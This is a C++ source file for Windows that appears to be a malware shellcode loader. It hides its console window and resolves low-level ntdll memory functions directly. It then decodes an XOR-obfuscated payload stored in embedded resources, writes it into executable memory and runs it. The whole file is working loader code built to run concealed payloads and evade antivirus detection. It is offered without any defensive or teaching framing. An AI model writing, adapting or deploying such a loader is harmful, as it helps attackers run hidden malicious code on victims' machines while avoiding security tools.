#include <iostream>
#include <string>
#include <windows.h>
#include <winternl.h>
#include "resource.h"

typedef NTSTATUS(NTAPI* NT_ALLOCATE_VIRTUAL_MEMORY) (
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);
NT_ALLOCATE_VIRTUAL_MEMORY NtAllocateVirtualMemory;

typedef NTSTATUS(NTAPI* NT_WRITE_VIRTUAL_MEMORY) (
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToWrite,
	PULONG NumberOfBytesWritten OPTIONAL);
NT_WRITE_VIRTUAL_MEMORY NtWriteVirtualMemory;

typedef NTSTATUS(NTAPI* NT_FREE_VIRTUAL_MEMORY) (
	HANDLE  ProcessHandle,
	PVOID* BaseAddress,
	PSIZE_T RegionSize,
	ULONG   FreeType
	);
NT_FREE_VIRTUAL_MEMORY NtFreeVirtualMemory;

void checkNtStatus(const NTSTATUS status);
const std::string loadPayload();

int main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	if (ntdll == NULL) {
		printf("Could not find ntdll. Exiting...\n");
		return 1;
	}
	NTSTATUS ntStatus;
	NtAllocateVirtualMemory = (NT_ALLOCATE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	NtWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	NtFreeVirtualMemory = (NT_FREE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtFreeVirtualMemory");

	const std::string payload = loadPayload();
	HANDLE currentProcess = GetCurrentProcess();
	SIZE_T size = payload.size();
	PVOID exec = NULL;

	ntStatus = NtAllocateVirtualMemory(currentProcess, &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	checkNtStatus(ntStatus);

	ntStatus = NtWriteVirtualMemory(currentProcess, exec, (PVOID)payload.c_str(), size, 0);
	checkNtStatus(ntStatus);

	((void(*)())exec)();

	ntStatus = NtFreeVirtualMemory(currentProcess, &exec, 0, MEM_RELEASE);
	checkNtStatus(ntStatus);

	FreeLibrary(ntdll);

	return 0;
}

void checkNtStatus(const NTSTATUS status)
{
	if (!NT_SUCCESS(status)) {
		printf("Failed in calling NtAllocateVirtualMemory(). Error code: 0x%16x\n", status);
		exit(1);
	}
}

const std::string loadPayload()
{
	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
	DWORD keySize = SizeofResource(NULL, keyResource);
	HGLOBAL keyResourceHandle = LoadResource(NULL, keyResource);
	char* key = (char*)LockResource(keyResourceHandle);

	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
	DWORD obfuscatedPayloadSize = SizeofResource(NULL, obfuscatedPayloadResource);
	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
	char* obfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
	std::string payload = "";

	int keyIndex = 0;
	for (unsigned int i = 0; i < obfuscatedPayloadSize; i += 4)
	{
		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
	}

	FreeResource(keyResourceHandle);
	FreeResource(obfuscatedPayloadResource);

	return payload;
}
